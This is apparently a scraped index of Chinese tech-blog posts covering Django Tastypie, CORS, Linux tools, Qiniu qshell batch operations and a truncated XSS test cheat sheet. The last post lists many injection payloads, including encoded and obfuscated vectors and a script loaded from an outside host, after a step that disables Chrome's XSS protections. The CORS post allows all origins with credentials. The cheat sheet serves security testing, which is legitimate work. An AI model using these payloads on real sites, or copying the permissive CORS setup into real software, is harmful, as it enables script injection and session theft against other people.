","description":"","id":550,"section":"post","tags":["博文","Django","接口","API","文档","研发"],"title":"Apidoc 实践和自动化生成","uri":"https://www.chenshaowen.com/blog/practice-and-automation-generation-of-apidoc.html"},{"content":"1. Restful REST，是Representational State Transfer的缩写，表现层状态转化。Restful，是一种开发理念，万维网软件架构风格。\n1.1 Restful特点 抽象资源\n图片、文本、歌曲、视频都是一种资源实体，在网络上，被抽象为资源。在Restful中，JSON常被用作这些资源的载体，统一对外提供数据信息。 统一接口\n对数据的增删改查，分别对应于不同的HTTP方法。 GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供完整资源数据）。 PATCH（UPDATE）：在服务器更新资源（客户端提供需要修改的资源数据）。 DELETE（DELETE）：从服务器删除资源。 HEAD：获取资源的元数据。 OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。 1.2 Restful规则 API URL前缀。为了兼顾API的扩展性，建议API的URL前缀设置为 http://example.com/api/v1/ URL中只能有名词。比如资源名和参数，http://example.com/api/v1/user/?id=1 操作使用HTTP头设置。常见的有五种HTTP方法，GET、POST、PUT、PATCH、DELETE ，还有两个不常见的动词，HEAD、OPTIONS。用法： GET /zoos/：列出所有动物园 POST /zoos/：新建一个动物园 GET /zoos/ID/：获取某个指定动物园的信息 PUT /zoos/ID/：更新某个指定动物园的信息（提供该动物园的全部信息） PATCH /zoos/ID/：更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/ID/：删除某个动物园 GET /zoos/ID/animals：列出某个指定动物园的所有动物 DELETE /zoos/ID/animals/ID/：删除某个指定动物园的指定动物 过滤规则 ?limit=10：指定返回记录的数量 ?offset=10：指定返回记录的开始位置。 ?page=2\u0026amp;per_page=100：指定第几页，以及每页的记录数 ?sortby=name\u0026amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序 ?animal_type_id=1：指定筛选条件 2. Tastypie 2.1 简介 Tastypie是基于Django的Restful api开发框架。通过简单的配置，就能对外提供Restful 风格的接口。\n2.2 安装配置 1 pip instal django-tastypie settings.py配置\n1 2 3 INSTALLED_APPS = ( \u0026#39;tastypie\u0026#39;, ) 1 python manage.py syncdb 2.3 授权Authorization 如果需要对接口的权限进行限制，Tastypie也提供相应的支持。\n第一步，继承Authorization类实现MyAuthorization权限管理类。\n需要实现的函数有：\ndef read_list(self, object_list, bundle) def read_detail(self, objec_list, bundle) def create_detail(self, object_list, bundle) def update_list(self, object_list, bundle) def update_detail(self, object_list, bundle) def delete_list(self, object_list, bundle) def delete_detail(self, object_list, bundle) 第二步，在Resource的Meta中，指定权限管理实例\n1 2 class Meta(BaseMeta): authorization = MyAuthorization() 2.4 捆对象 Bundles 在定制Resource的过程中，不可避免的会使用捆对象，这是一个抽象的概念，代表了获取资源，或者写入资源过程中对单个资源的封装\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class BucketObject(object): def __init__(self, initial=None): self.__dict__[\u0026#39;_data\u0026#39;] = {} if hasattr(initial, \u0026#39;items\u0026#39;): self.__dict__[\u0026#39;_data\u0026#39;] = initial def __getattr__(self, name): return self._data.get(name, None) def __setattr__(self, name, value): self.__dict__[\u0026#39;_data\u0026#39;][name] = value def to_dict(self): return self._data 这里的BucketObject，并不对应任何的Model，只是当做对资源的一次打包，可以是几个model的合集，也可以是接口访问后封装的数据。\n2.5 ModelResource ModelResource 是基于已有Model提供Restful API。\n第一步，创建resource资源\nreasource.py\n1 2 3 4 5 6 7 8 9 10 from tastypie.resources import ModelResource from .models import QuickView class QickViewResource(ModelResource): class Meta: # 定义查询范围 queryset = QuickView.objects.all() # 定义资源名 resource_name = \u0026#39;QucikView\u0026#39; # 其他配置 excludes = [\u0026#39;create_time\u0026#39;, \u0026#39;update_time\u0026#39;] 第二步，配置url路由，注册接口\n1 2 3 4 5 6 7 8 9 10 11 from tastypie.api import Api from ci.api.resources import QickViewResource # 创建API V1版本，URL形式为/api/v1/ api_v1 = Api(api_name=\u0026#39;v1\u0026#39;) # 注册资源 api_v1.register(QickViewResource()) # 新增资源注册放在这里 urlpatterns = patterns(\u0026#39;\u0026#39;, (r\u0026#39;^api/\u0026#39;, include(api_v1.urls)), ) 第三步，开始使用\n/api/v1/?format=json\n查看api v1注册的全部资源，list_endpoint表示资源端点，schema提供的URL可以查看字段和使用规则。\n1 2 3 4 5 6 { QucikView: { list_endpoint: \u0026#34;/api/v1/QucikView/\u0026#34;, schema: \u0026#34;/api/v1/QucikView/schema/\u0026#34; } } /api/v1/QucikView/schema/?format=json\n给出了基本的操作权限，默认参数，返回对象的字段和字段提示等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { allowed_detail_http_methods: [ \u0026#34;get\u0026#34;, \u0026#34;post\u0026#34;, \u0026#34;put\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;patch\u0026#34; ], allowed_list_http_methods: [ \u0026#34;get\u0026#34;, \u0026#34;post\u0026#34;, \u0026#34;put\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;patch\u0026#34; ], default_format: \u0026#34;application/json\u0026#34;, default_limit: 20, fields: { app_id: { blank: false, default: \u0026#34;No default provided.\u0026#34;, help_text: \u0026#34;Unicode string data. Ex: \u0026#34;Hello World\u0026#34;\u0026#34;, nullable: false, primary_key: false, readonly: false, type: \u0026#34;string\u0026#34;, unique: false, verbose_name: \u0026#34;业务ID\u0026#34; } } /api/v1/QucikView/?format=json\u0026amp;limit=1\n获取资源的QucikView的列表，如果有分页，tastypie还会给出提示连接\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { meta: { limit: 1, next: \u0026#34;/api/v1/QucikView/?offset=1\u0026amp;limit=1\u0026amp;format=json\u0026#34;, offset: 0, previous: null, total_count: 8 }, objects: [ { app_id: \u0026#34;1\u0026#34;, create_time: \u0026#34;2017-06-12T11:42:30.071000\u0026#34;, data: \u0026#34;{sadknlsakbf}\u0026#34;, id: 1, index: 0, is_deleted: false, pipeline_id: \u0026#34;2\u0026#34;, resource_uri: \u0026#34;/ci/api/v1/QucikView/1/\u0026#34; } ] } 2.6 Resource 如果需要基于第三方接口，或者几个Model，或者非ORM的数据源，对外提供Restful的接口，ModelResource 可能并不适用。tastypie 提供了Resource 类来抽象这部分资源。\n这里主要是理解，上面提到的 捆对象 Bundles 概念，写一个BucketObject类，将资源封装在其中。\nreasource.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class BuildResource(Resource): buildNo = fields.CharField(attribute=\u0026#39;buildNo\u0026#39;) starter = fields.CharField(attribute=\u0026#39;starter\u0026#39;) duration = fields.CharField(attribute=\u0026#39;duration\u0026#39;) endTime = fields.CharField(attribute=\u0026#39;endTime\u0026#39;) csReleaseNote = fields.CharField(attribute=\u0026#39;csReleaseNote\u0026#39;) statusBuild = fields.CharField(attribute=\u0026#39;statusBuild\u0026#39;) totalBuildNum = fields.CharField(attribute=\u0026#39;totalBuildNum\u0026#39;) class Meta: resource_name = \u0026#39;BuildList\u0026#39; allowed_methods = [\u0026#39;get\u0026#39;] object_class = BucketObject authorization = Authorization() def obj_get_list(self, request=None, **kwargs): if not request: request = kwargs[\u0026#39;bundle\u0026#39;].request return self.get_object_list(request) def get_object_list(self, request): results = [] key_list = (\u0026#34;buildNo\u0026#34;, \u0026#34;starter\u0026#34;, \u0026#34;duration\u0026#34;, \u0026#34;endTime\u0026#34;, \u0026#34;csReleaseNote\u0026#34;, \u0026#34;statusBuild\u0026#34;, \u0026#34;statusBuild\u0026#34;, \u0026#34;totalBuildNum\u0026#34;) new_obj = BucketObject() for key in key_list: # 这里调用第三方接口，或者取其他Model数据，填充BucketObject setattr(new_obj, key, key+\u0026#34;_vaule\u0026#34;) results.append(new_obj) return results url中的配置和ModelResource一样。这里仅仅实现了get的函数重载，如果对应其他操作，也需要重写相应的函数。一共有九个：\ndetail _uri _kwargs get object_list obj _get _list obj _get obj _create obj _update obj _delete_list obj _delete rollback 3. 参考 https://codeslashslashcomment.com/2012/11/13/call-diagram-of-django-tastypie-resource-get_list-method/ http://django-tastypie.readthedocs.io/en/latest/tutorial.html ","description":"","id":551,"section":"post","tags":["博文","Django","接口","API","Tastypie"],"title":"Django Restful 接口之 Tastypie","uri":"https://www.chenshaowen.com/blog/restful-api-of-using-django-tastypie.html"},{"content":"1. 同源策略 同源策略是浏览器的安全基石。\n同源的定义，包括三个方面：\n协议相同 域名相同 端口相同 限制范围：\nCookie、LocalStorage 和 IndexDB 无法读取 DOM 无法获得 AJAX 请求不能发送 简单说，协议、域名、端口三者任意不同的两个 URL 之间不允许通信，范围包括获取对方 Cookie，DOM，发送 AJAX 请求。\n2. 跨域通信 共享 Cookie。一级域名相同，二级域名不同，可以共享 Cookie 实现跨域。 片段识别符。http://x.com/x.html#data，URL# 后面的 data 指的就是片段标识符，iframe 可以获取到 data，从而实现跨域。 window.name。无论是否同源，只要在同一个窗口里，前一个网页设置了 window.name ，后一个网页可以读取它。 window.postMessage。跨文档通信 API ，允许跨窗口通信，不论这两个窗口是否同源。 3. AJAX JSONP\n网页添加一个script元素，向服务器请求JSON数据，服务器收到请求后，将数据放在一个指定的回调函数里。但是，只能发GET请求。 WebSocket\nWebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，因为Origin字段可以设置请求源。 CORS\nCORS 需要浏览器和服务器同时支持，CORS 通信与同源的 AJAX 通信没有差别。\n浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息\n服务器端需要设置，（1）Access-Control-Allow-Origin 允许的源，（2）Access-Control-Allow-Credentials 是否发送 Cookie 和 HTTP 认证信息，（3）Access-Control-Expose-Headers 允许脚本访问的返回头。 4. django-cors-headers 安装\n1 pip install django-cors-headers settings.py配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 INSTALLED_APPS = ( \u0026#39;corsheaders\u0026#39;, ) MIDDLEWARE = [ \u0026#39;corsheaders.middleware.CorsMiddleware\u0026#39;, \u0026#39;django.middleware.common.CommonMiddleware\u0026#39;, ] CORS_ALLOW_HEADERS = ( \u0026#39;accept\u0026#39;, \u0026#39;accept-encoding\u0026#39;, \u0026#39;authorization\u0026#39;, \u0026#39;content-type\u0026#39;, \u0026#39;dnt\u0026#39;, \u0026#39;origin\u0026#39;, \u0026#39;user-agent\u0026#39;, \u0026#39;x-csrftoken\u0026#39;, \u0026#39;x-requested-with\u0026#39;, ) CORS_ORIGIN_ALLOW_ALL = True CORS_ALLOW_CREDENTIALS = True 更详细的配置，可以去项目主页，Go\n5. 参考 https://github.com/ottoyiu/django-cors-headers http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html http://www.ruanyifeng.com/blog/2016/04/cors.html\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS ","description":"","id":552,"section":"post","tags":["前端","网络","安全","博文"],"title":"同源策略与跨域访问","uri":"https://www.chenshaowen.com/blog/same-origin-policy.html"},{"content":"Linux 平台上的性能工具有很多，眼花缭乱，长期的摸索和经验发现最好用的，还是那些久经考验的、简单的小工具。下面是，系统性能专家 Brendan D.Gregg ，关于Linux性能方面的talk(Linux Performance Tools)中所整理的命令工具。\n1. 总览 2. 监控 3. 测试 4. 优化 5. 静态 6. 追踪 7. 参考 http://www.brendangregg.com/linuxperf.html\n","description":"","id":553,"section":"post","tags":["整理","Linux"],"title":"Linux 性能命令工具","uri":"https://www.chenshaowen.com/blog/linux-performance-command-tools.html"},{"content":"副标题: 使用D3实际交互式图表\n原作名: Interactive data visualization for the Web\n作者: [美] Scott Murray\n译者: 李松峰\n出版社: 人民邮电出版社\n出版年: 2013-6\nISBN: 9787115320117\n","description":"","id":554,"section":"post","tags":["书籍","数据","前端"],"title":"数据可视化实战","uri":"https://www.chenshaowen.com/blog/book/interactive-data-visualization-for-the-web.html"},{"content":"1. 下载工具 - qshell qshell 是利用七牛文档上公开的 API 实现的一个方便开发者测试和使用七牛API服务的命令行工具，使用 Go 语言编写而成。目前该工具融合了七牛存储， CDN ，以及其他的一些七牛服务中经常使用到的方法对应的便捷命令。\n| 版本 | 支持平台 | 链接 | 更新日志 |\n| \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;- |:\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-:| \u0026mdash;\u0026ndash;:|\n| qshell v2.0.7 | Linux (32, 64位，arm平台), Windows(32, 64位), Mac OSX(32, 64位) | 下载 | 查看|\n下载qshell命令zip包，解压。你会发现，里面有多个系统的qshell命令文件。选择适合自己系统的文件，重命名为qshell。为了任意目录都能使用qshell命令，建议将qshell文件拷贝至PATH中的某一个目录。比如，本人安装了GO，并将其bin目录加入了PATH，就直接qshell拷贝到C:/Go/bin/目录下即可。\n2. 设置账号Key 新版的qshell需要将账户信息设置在单独的文件中。下面的Administrator，改为对应的账户名。key在七牛登录后页面的【个人面板】- 【秘钥管理】可以查看。旧版的qshell命令，key设置在命令的配置文件参数中。\n1 2 3 4 5 C:\\Users\\Administrator\\.qshell\\account.json { \u0026#34;access_key\u0026#34; : \u0026#34;**************************\u0026#34;, \u0026#34;secret_key\u0026#34; : \u0026#34;**************************\u0026#34; } 或者使用命令设置\n1 qshell account [access_key] [secret_key] 3. 批量上传 命令格式: qshell qupload [并发数量] [配置文件名]\n1 2 3 4 5 upload.conf { \u0026#34;src_dir\u0026#34; : \u0026#34;D:\\qiniu\\upload_dir\u0026#34;, \u0026#34;bucket\u0026#34; : \u0026#34;mybucket\u0026#34; } 1 qshell qupload 20 upload.conf 上述命令的操作是，以每秒二十次的频率，上传D盘 qiniu/upload_dir 目录下的文件，至 bucket 名为 mybucket 下。\n比如，有文件 D:/qiniu/upload_dir/te/tex.txt，上传之后在 mybucket 下有文件 te/tex.txt ，目录结构会保留，更多设置请参考官方文档。\nTips: 建议并发不要设置太高，会有文件遗漏上传。\n4. 批量下载 命令格式: qshell qdownload [并发数量] [配置文件名]\n1 2 3 4 5 6 7 8 down.conf { \u0026#34;dest_dir\u0026#34; : \u0026#34;D:\\qiniu\\download_dir\u0026#34;, \u0026#34;domain\u0026#34; : \u0026#34;http://xxx.com1.z0.glb.qiniucdn.com\u0026#34;, \u0026#34;bucket\u0026#34; : \u0026#34;mybucket\u0026#34;, \u0026#34;prefix\u0026#34; : \u0026#34;test/\u0026#34; } qshell qdownload 20 down.conf 上述命令的操作是，以每秒二十次的频率，从http://xxx.com1.z0.glb.qiniucdn.com 空间的mybucket，下载全部以test/开头的文件，保存在本地的 D:/qiniu/download_dir 目录下。\n比如，在 mybucket 下有文件 test/te/tex.txt，下载之后会有 D:/qiniu/download_dir/test/te/tex.txt，目录结构会保留，更多设置请参考官方文档。\n5. 批量删除 命令格式: qshell batchdelete [-force] [空间名] [保存待删除文件名的文本]\n删除操作无法恢复，执行 batchdelete 时，出于谨慎策略需要输入验证码。如果不想输入验证码，可以带上可选参数 -force。\n这里比较麻烦的是，如何获得[保存待删除文件名的文本]。\n1 find my_dir -type f \u0026gt;file_name_list.txt 在 Linux 下可以直接使用 find 命令，在 Windows 下需要借助 Cygwin 执行 find 命令。本人实践时，先将需要操作的目录，通过 qdownload 命令下载到 download_dir 目录。然后，在download_dir 目录执行上述命令，导出 my_dir 目录下全部文件名列表。\n1 2 3 4 5 6 7 8 # file_name_list.txt my_dir/testapp/requirements.txt my_dir/testapp/settings.py my_dir/testapp/test_processes.py my_dir/testapp/test_tasks.py my_dir/testapp/__init__.py my_dir/tests/test_stackless.py my_dir/tests/__init__.py 最后执行 batchdelete 命令删除指定 bucket 的文件。这里就是删除 mybucket 下，上述file_name_list.txt中文件名对应文件。\n1 qshell batchdelete mybucket file_name_list.txt ","description":"","id":555,"section":"post","tags":["博文","数据","Demo","CDN","七牛","批量"],"title":"七牛存储批量操作 - qshell","uri":"https://www.chenshaowen.com/blog/qiniu-storage-batch-operation-using-qshell.html"},{"content":" 如果使用Chrome浏览器测试XSS向量，请关闭浏览器对XSS的拦截功能。首先，关闭所有Chrome浏览器进程，然后执行：\n1 chrome.exe -args --disable-xss-auditor --args --disable-web-security 进入非Web安全模式。\n1. 利用\u0026lt;\u0026gt;标记注入HTML/JavaScript 1 \u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 1 \u0026#39;\u0026#39;;!--\u0026#34;\u0026lt;XSS\u0026gt;=\u0026amp;{()} 1 2 //SRC的引号是可以省略的 \u0026lt;SCRIPT SRC=http://ha.ckers.org/xss.js\u0026gt;\u0026lt;/SCRIPT\u0026gt; 2. 利用HTML标签属性执行XSS 1 \u0026lt;IMG SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;IMG SRC=javascript:alert(\u0026#39;XSS\u0026#39;)\u0026gt; 1 \u0026lt;IMG SRC=JaVaScRiPt:alert(\u0026#39;XSS\u0026#39;)\u0026gt; 1 \u0026lt;IMG SRC=javascript:alert(\u0026#34;XSS\u0026#34;)\u0026gt; 1 \u0026lt;INPUT TYPE=\u0026#34;IMAGE\u0026#34; SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;BODY BACKGROUND=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;IMG DYNSRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;IMG LOWSRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;IFRAME SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt;\u0026lt;/IFRAME\u0026gt; 1 \u0026lt;FRAMESET\u0026gt;\u0026lt;FRAME SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt;\u0026lt;/FRAMESET\u0026gt; 1 \u0026lt;TABLE BACKGROUND=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;TABLE\u0026gt;\u0026lt;TD BACKGROUND=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;OBJECT TYPE=\u0026#34;text/x-scriptlet\u0026#34; DATA=\u0026#34;http://ha.ckers.org/scriptlet.html\u0026#34;\u0026gt;\u0026lt;/OBJECT\u0026gt; 1 \u0026lt;BGSOUND SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;BR SIZE=\u0026#34;\u0026amp;{alert(\u0026#39;XSS\u0026#39;)}\u0026#34;\u0026gt; 1 \u0026lt;LINK REL=\u0026#34;stylesheet\u0026#34; HREF=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;IFRAME SRC=# onmouseover=\u0026#34;alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt;\u0026lt;/IFRAME\u0026gt; 1 \u0026lt;META HTTP-EQUIV=\u0026#34;Set-Cookie\u0026#34; Content=\u0026#34;USERID=\u0026lt;SCRIPT\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt; 3. 利用空格、回车、Tab等分隔符 1 \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 2 \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 4. 对标签的属性值转码 1 \u0026lt;IMG SRC=\u0026amp;#0000106\u0026amp;#0000097\u0026amp;#0000118\u0026amp;#0000097\u0026amp;#0000115\u0026amp;#0000099\u0026amp;#0000114\u0026amp;#0000105\u0026amp;#0000112\u0026amp;#0000116\u0026amp;#0000058\u0026amp;#0000097\u0026amp;#0000108\u0026amp;#0000101\u0026amp;#0000114\u0026amp;#0000116\u0026amp;#0000040\u0026amp;#0000039\u0026amp;#0000088\u0026amp;#0000083\u0026amp;#0000083\u0026amp;#0000039\u0026amp;#0000041\u0026gt; 1 \u0026lt;IMG SRC=\u0026#34;jav\u0026amp;#x09;ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;IMG SRC=\u0026#34;jav\u0026amp;#x0D;ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;IMG SRC=\u0026amp;#x6A\u0026amp;#x61\u0026amp;#x76\u0026amp;#x61\u0026amp;#x73\u0026amp;#x63\u0026amp;#x72\u0026amp;#x69\u0026amp;#x70\u0026amp;#x74\u0026amp;#x3A\u0026amp;#x61\u0026amp;#x6C\u0026amp;#x65\u0026amp;#x72\u0026amp;#x74\u0026amp;#x28\u0026amp;#x27\u0026amp;#x58\u0026amp;#x53\u0026amp;#x53\u0026amp;#x27\u0026amp;#x29\u0026gt; 1 \u0026lt;META HTTP-EQUIV=\u0026#34;refresh\u0026#34; CONTENT=\u0026#34;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\u0026#34;\u0026gt; 1 \u0026lt;DIV STYLE=\u0026#34;background-image:\\0075\\0072\\006C\\0028\u0026#39;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\u0026#39;\\0029\u0026#34;\u0026gt; 1 \u0026lt;DIV STYLE=\u0026#34;background-image: url(\u0026amp;#1;javascript:alert(\u0026#39;XSS\u0026#39;))\u0026#34;\u0026gt; 1 \u0026lt;EMBED SRC=\u0026#34;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\u0026#34; type=\u0026#34;image/svg+xml\u0026#34; AllowScriptAccess=\u0026#34;always\u0026#34;\u0026gt;\u0026lt;/EMBED\u0026gt; 1 2 3 4 5 \u0026#39;;alert(String.fromCharCode(88,83,83))//\u0026#39;;alert(String.fromCharCode(88,83,83))//\u0026#34;; alert(String.fromCharCode(88,83,83))//\u0026#34;;alert(String.fromCharCode(88,83,83))//-- \u0026gt;\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt;\u0026#39;\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(String.fromCharCode(88,83,83))\u0026lt;/SCRIPT\u0026gt; 1 \u0026lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))\u0026gt; 1 2 \u0026lt;IMG SRC=\u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;\u0026amp;#58;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40; \u0026amp;#39;\u0026amp;#88;\u0026amp;#83;\u0026amp;#83;\u0026amp;#39;\u0026amp;#41;\u0026gt; 5. 产生自己的事件 1 \u0026lt;IMG SRC=# onmouseover=\u0026#34;alert(\u0026#39;xxs\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;IMG SRC= onmouseover=\u0026#34;alert(\u0026#39;xxs\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;IMG onmouseover=\u0026#34;alert(\u0026#39;xxs\u0026#39;)\u0026#34;\u0026gt; 1 \u0026lt;IMG SRC=/ onerror=\u0026#34;alert(String.fromCharCode(88,83,83))\u0026#34;\u0026gt;\u0026lt;/img\u0026gt; 1 \u0026lt;BODY ONLOAD=alert(\u0026#39;XSS\u0026#39;)\u0026gt; 事件列表：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 1. FSCommand() (攻击者可以使用它当执行一个嵌入的flash对象时) 2. onAbort() (当使用者终止一张正在载入的图片) 3. onActivate() (当对象被设置为激活元素) 4. onAfterPrint() (用户打印或是预览打印工作后激活) 5. onAfterUpdate() (激活在一个数据对象当源对象数据更新后) 6. onBeforeActivate() (触发在一个对象被设置为激活元素) 7. onBeforeCopy() (攻击者执行攻击代码在一个选区被复制到剪贴板之前-攻击者可以实现它通过execCommand(\u0026#34;Copy\u0026#34;)函数。) 8. onBeforeCut() (攻击者执行攻击代码在在一个选区被剪贴。) 9. onBeforeDeactivate() (当激活元素被改变后触发) 10. onBeforeEditFocus() (触发在一个可被编辑的元素内的对象就按测到一个 UI-activated状态或是一个可被编辑对象被选择之前) 11. onBeforePaste() (用户需要被欺骗执行粘贴或是去触发它通过execCommand(\u0026#34;Paste\u0026#34;)函数。) 12. onBeforePrint() (用户需要被欺骗执行打印或是攻击者可以使用print()或是execCommand(\u0026#34;Print\u0026#34;)函数。) 13. onBeforeUnload() (用户需要被欺骗关闭浏览器-攻击者不可以 unload windows除非它是被执行从其父窗口。) 14. onBeforeUpdate() (激活在数据对象在源对象更新数据之后。) 15. onBegin() (onbegin 事件被立即触发当元素的声明周期开始后) 16. onBlur() (当失去焦点时触发*) 17. onBounce() (触发当选框对象的behavior属性被设置为\u0026#34;alternate\u0026#34;或是选框的内容抵达窗口的一边。) 18. onCellChange() (触发当数据改变在数据provider) 19. onChange() (select, text, or TEXTAREA 字段失去焦点或是它们的值是被改变。) 20. onClick()(点击事件) 21. onContextMenu() (用户需要右击在攻击攻击区域) 22. onControlSelect() (当用户去控制一个选择对象时触发。) 23. onCopy() (用户需要去copy某些东西或是利用execCommand(\u0026#34;Copy\u0026#34;)命令) 24. onCut() (用户需要copy某些东西或是利用execCommand(\u0026#34;Cut\u0026#34;) 命令) 25. onDataAvailable() (用户改变数据在某个元素上或是攻击者可以执行相同的函数。) 26. onDataSetChanged() (当源数据对象被改变时触发) 27. onDataSetComplete() (触发当数据是成功获取到从数据源对象) 28. onDblClick() (用户双击某个元素。) 29. onDeactivate() (当当前元素失去激活状态时触发) 30. onDrag() (需要用户拖动某个对象) 31. onDragEnd() (需要用户拖动某个对象) 32. onDragLeave() (需要用户拖动某个对象从一个有效的位置。) 33. onDragEnter() (需要用户拖动某个对象从一个有效的位置。) 34. onDragOver() (需要用户拖动某个对象从一个有效的位置。) 35. onDragDrop() (用户拖动某个对象（例如文件）到浏览器窗口内。) 36. onDragStart() (当用户开始拖动操作时发生。) 37. onDrop() (用户拖动某个对象（例如文件）到浏览器窗口内。) 38. onEnd() (当生命周期结束时触发） 39. onError() (载入document 或 image发生错误时触发) 40. onErrorUpdate() (当更新数据源的相关对象时发生错误则触发) 41. onFilterChange() (当一个滤镜完成状态改变时触发) 42. onFinish() (移动的Marquee文字完成一次移动时触发) 43. onFocus() (当窗口获得焦点时攻击者可以执行代码) 44. onFocusIn() (当窗口获得焦点时攻击者可以执行代码) 45. onFocusOut() (当窗口失去焦点时攻击者可以执行代码) 46. onHashChange() (当当前地址的hash发生改变时触发) 47. onHelp() (当用户在当前窗口点击F1时触发攻击代码) 48. onInput() (可编辑元素中的内容被用户改变后出发) 49. onKeyDown() (用户按下一个键) 50. onKeyPress() (用户点击或是按下一个键) 51. onKeyUp() (用户释放一个键) 52. onLayoutComplete() (用户需要去打印或是打印预览) 53. onLoad() (攻击者执行攻击代码在窗口载入后) 54. onLoseCapture() (可以被触发被releaseCapture() 方法) 55. onMediaComplete() (当波翻改一个流媒体文件时，这个事件将触发在文件开始播放前。) 56. onMediaError() (当用户打开的页面包含一个媒体文件，并且发生错误时触发) 57. onMessage() (当文档对象接受到一个信息时触发) 58. onMouseDown() (攻击者需要让用户去点击一张图片。) 59. onMouseEnter() (光标移入一个对象或是区域) 60. onMouseLeave() (攻击者需要让用户移动光标进入一个图片或是表格，接着再次移出) 61. onMouseMove() (攻击者需要让用户移动鼠标进入一个图片或是表格上) 63. onMouseOver() (光标移到一个对象或是区域上) 64. onMouseUp() (攻击者需要让用户点击一张图片) 65. onMouseWheel() (拥挤着需要让用户去使用他们的鼠标滚轮) 66. onMove() (用户或攻击者需要移动页面) 67. onMoveEnd() (用户说攻击者需要移动页面) 68. onMoveStart() (用户说攻击者需要移动页面) 69. onOffline() (浏览器从在线模式转换到离线模式时发生) 70. onOnline() (浏览器从离线模式转换到在线模式时发生) 71. onOutOfSync() (interrupt the element\u0026#39;s ability to play its media as defined by the timeline) 72. onPaste() (用户需要去粘贴或是攻击者执行execCommand(\u0026#34;Paste\u0026#34;) 方法) 73. onPause() (当激活元素时间停顿时触发，包括body元素) 74. onPopState() (当用户返回会话历史时触发) 75. onProgress() (当一个flash动画载入时触发) 76. onPropertyChange() 